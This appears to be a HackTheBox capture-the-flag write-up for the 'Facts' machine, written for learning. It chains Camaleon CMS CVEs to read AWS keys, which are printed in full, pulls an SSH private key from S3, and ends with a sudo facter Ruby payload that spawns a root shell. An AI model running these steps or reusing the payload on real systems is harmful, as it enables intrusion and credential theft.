---
layout: default
title: "HTB - Facts"
---

# 🧠 HackTheBox – Facts

---

## 🎯 Objective

The objective of this machine is to gain initial access through a vulnerable web application, escalate privileges via cloud misconfiguration (AWS S3), and ultimately achieve root access through a Linux privilege escalation vector.

---

## 📌 Summary

Facts is an easy-difficulty machine that demonstrates a multi-stage attack chain involving web exploitation, cloud misconfiguration, credential access, and privilege escalation.

Initial access is obtained by identifying an exposed `/admin/register` endpoint on a Camaleon CMS 2.9.0 instance, allowing arbitrary user registration. A known vulnerability is then leveraged to escalate privileges and gain administrative access.

During post-exploitation, AWS S3 credentials are discovered, leading to access to a misconfigured S3 bucket containing an `id_ed25519` SSH private key. The key’s passphrase is cracked, enabling SSH access to the target system.

Privilege escalation is achieved by abusing a misconfigured `sudo` rule involving the `facter` binary, resulting in full system compromise.

---

## 🧭 Attack Path Overview

```text
Web Application (Camaleon CMS)
        ↓
Admin Registration Abuse
        ↓
Privilege Escalation (CMS Exploit)
        ↓
AWS Credentials Discovery
        ↓
S3 Bucket Access
        ↓
SSH Key Exfiltration
        ↓
User Access (SSH)
        ↓
Privilege Escalation (sudo facter)
        ↓
Root Access

## 🌐 Host Mapping

```bash
echo "10.129.35.249 facts.htb" | sudo tee -a /etc/hosts
```

Discovered endpoints:

* `/admin/login`
* `/admin/register`

Target CMS identified as **Camaleon CMS**

---

## 👤 Initial Access – Admin Privilege Escalation

A user account was created:

* **Username:** `mew1222`
* **Password:** `mew121212`

The application was vulnerable to:

* **CVE-2025-2304**
* Mass assignment in role handling

This allowed privilege escalation to **admin-level access**.

---

## 📂 Arbitrary File Read → Credential Discovery

Using:

* **CVE-2024-46987 (Camaleon CMS File Read)**

Sensitive configuration files were accessed, revealing AWS credentials.

---

## ☁️ AWS S3 Exploitation

### 🔐 Retrieved Credentials

* **Access Key:** `AKIAD337D13639BD95BE`
* **Secret Key:** `v9WTmIuNeeq4L5s72WobV6CQs6HIJVkrq7NdRpZb`
* **Region:** `us-east-1`
* **Buckets:**

  * `internal`
  * `randomfacts`
* **Endpoint:**

  ```
  http://facts.htb:54321
  ```

---

### 📦 Bucket Enumeration

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

Output:

```text
2025-09-11 07:06:52 internal
2025-09-11 07:06:52 randomfacts
```

Further enumeration of the internal bucket:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal --recursive
```

---

### 📥 SSH Key Extraction

A sensitive SSH private key was discovered inside the bucket and extracted:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

---

### 🔑 Result

* File retrieved: `id_ed25519`
* Contains SSH private key for internal user access

After fixing permissions:

```bash
chmod 600 id_ed25519
```

---

## 🔐 SSH Access – User Trivia

Login performed using the recovered key:

```bash
ssh -i id_ed25519 trivia@facts.htb
```

Passphrase:

```text
dragonballz
```

Successful login granted shell access as:

```text
trivia@facts.htb
```

---

## 👤 User Flag

```bash
cat /home/william/user.txt
```

```text
f36*****************
```

---

## ⚡ Privilege Escalation – facter Abuse

Sudo permission discovered:

```bash
sudo /usr/bin/facter --custom-dir /tmp
```

### Vulnerability

* `facter` loads Ruby scripts from a user-writable directory
* This allows arbitrary code execution as root

---

## 💥 Privilege Escalation Flow

<div class="mermaid">
flowchart TD
    A[User: trivia] --> B[sudo facter --custom-dir /tmp]
    B --> C[Writable /tmp directory]
    C --> D[Drop malicious Ruby script]
    D --> E[facter executes script]
    E --> F[exec '/bin/sh']
    F --> G[Root Shell]
</div>

<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>mermaid.initialize({startOnLoad:true});</script>
---

### 🧨 Exploit Payload

```bash
echo 'exec("/bin/sh")' > /tmp/x.rb
sudo /usr/bin/facter --custom-dir /tmp
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

```text
eda2*****************
```

---

## 📌 Key Takeaways

* Mass assignment vulnerabilities can directly lead to privilege escalation
* File read vulnerabilities often expose cloud credentials
* S3 misconfigurations remain a critical real-world risk
* Writable plugin/script directories in sudo contexts are extremely dangerous
* Full compromise was achieved through chaining multiple small flaws

---

## 🛠️ Tools Used

* Nmap
* Burp Suite / curl
* AWS CLI
* Python exploit scripts
* SSH
* Linux enumeration tools

---

## 🚩 Flags

### User Flag

```text
f36*****************
```

### Root Flag

```text
eda*****************
```

---

## 🧠 Final Thoughts

This machine demonstrates a realistic enterprise attack chain:

* Web application misconfiguration
* Cloud credential leakage
* Object storage abuse
* Linux privilege escalation via unsafe sudo tooling

Each vulnerability alone was minor, but combined they resulted in full system compromise.
